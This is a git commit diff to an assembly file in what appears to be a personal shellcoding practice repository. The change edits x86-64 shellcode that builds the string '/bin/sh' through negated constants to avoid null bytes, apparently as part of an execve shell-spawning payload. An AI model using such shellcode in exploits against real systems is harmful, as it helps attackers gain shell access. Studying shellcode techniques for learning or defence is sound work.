3c5bb62ab30322e500e814e7f2b665754ad08cf0
chase1635321 <chasekanipe@gmail.com>
2019-06-18 14:59:55 -0400

    done

--- ring0/shellcoding/main.s
+++ ring0/shellcoding/main.s
@@ -4,7 +4,15 @@ section .text
       push rax
       xor rdx, rdx
       xor rsi, rsi
-      mov rax, 0x978cd0d091969dd1
+      ;mov rax, 0x978cd0d1
+      ;mov rax, 0x68732f2f
+      ;neg eax
+      ;push rax
+      ;mov rax, 0x91969dd1
+      ;mov rax, 0x6e69622f
+      ;neg eax
+      ;push rax
+      mov rax, 0xFF978CD091969DD1
       neg rax
       push rax
       xor rax, rax
